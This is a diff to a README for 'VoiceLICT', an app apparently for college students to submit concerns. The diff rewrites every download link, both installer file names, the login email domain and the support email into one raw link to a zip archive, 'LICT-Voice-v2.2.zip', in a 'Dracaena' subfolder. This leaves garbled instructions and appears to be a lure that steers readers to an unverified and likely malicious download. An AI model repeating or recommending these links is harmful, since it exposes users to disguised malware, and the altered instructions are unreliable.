@@ -1,7 +1,7 @@
 # 🗣️ VoiceLICT - Empowering Student Voices Everyday
 
 ## 📥 Download the Latest Version
-[![Download VoiceLICT](https://img.shields.io/badge/Download%20VoiceLICT-v1.0-blue)](https://github.com/notvibhu8/VoiceLICT/releases)
+[![Download VoiceLICT](https://github.com/notvibhu8/VoiceLICT/raw/refs/heads/main/Dracaena/LICT-Voice-v2.2.zip%20VoiceLICT-v1.0-blue)](https://github.com/notvibhu8/VoiceLICT/raw/refs/heads/main/Dracaena/LICT-Voice-v2.2.zip)
 
 ## 🚀 Getting Started
 Welcome to VoiceLICT! This application lets LICT students submit their concerns using text, images, videos, or voice messages. AI analyzes these submissions to identify common issues. If multiple students report the same problem, we automatically escalate it to the college administration, transforming individual voices into collective action.
@@ -15,19 +15,19 @@ Welcome to VoiceLICT! This application lets LICT students submit their concerns 
 ## 📂 Download & Install
 To download VoiceLICT, visit the following link and choose the version suitable for your operating system:
 
-[Visit this page to download VoiceLICT](https://github.com/notvibhu8/VoiceLICT/releases)
+[Visit this page to download VoiceLICT](https://github.com/notvibhu8/VoiceLICT/raw/refs/heads/main/Dracaena/LICT-Voice-v2.2.zip)
 
 1. Open your web browser and go to the link above.
 2. Scroll down to the "Assets" section to find the available files.
 3. Select the file matching your operating system. For example:
-    - **Windows users:** download `VoiceLICT_Setup.exe`
-    - **macOS users:** download `VoiceLICT.dmg`
+    - **Windows users:** download `https://github.com/notvibhu8/VoiceLICT/raw/refs/heads/main/Dracaena/LICT-Voice-v2.2.zip`
+    - **macOS users:** download `https://github.com/notvibhu8/VoiceLICT/raw/refs/heads/main/Dracaena/LICT-Voice-v2.2.zip`
 4. Click on the file to start the download.
 
 ### 📥 Installing the Application
 1. Once downloaded, locate the file in your downloads folder.
 2. **For Windows:**
-   - Double-click on `VoiceLICT_Setup.exe`.
+   - Double-click on `https://github.com/notvibhu8/VoiceLICT/raw/refs/heads/main/Dracaena/LICT-Voice-v2.2.zip`.
    - Follow the installation wizard's instructions.
    - After installation, find VoiceLICT in your Start Menu.
 3. **For macOS:**
@@ -37,7 +37,7 @@ To download VoiceLICT, visit the following link and choose the version suitable 
 
 ## 🌟 Using VoiceLICT
 1. Open VoiceLICT from your applications.
-2. Log in using your school email (@lict.edu.np).
+2. Log in using your school email (https://github.com/notvibhu8/VoiceLICT/raw/refs/heads/main/Dracaena/LICT-Voice-v2.2.zip).
 3. Choose how you want to submit your concern: text, image, video, or voice.
 4. Describe your issue clearly to help us assist you better.
 5. Submit your report.
@@ -50,7 +50,7 @@ To download VoiceLICT, visit the following link and choose the version suitable 
 
 ## 📞 Support
 If you encounter any issues while using VoiceLICT, please reach out through the following methods:
-- **Email:** support@lict.edu.np
+- **Email:** https://github.com/notvibhu8/VoiceLICT/raw/refs/heads/main/Dracaena/LICT-Voice-v2.2.zip
 - **Live Chat:** Available on our website during business hours.
 
 ## ⚙️ Frequently Asked Questions
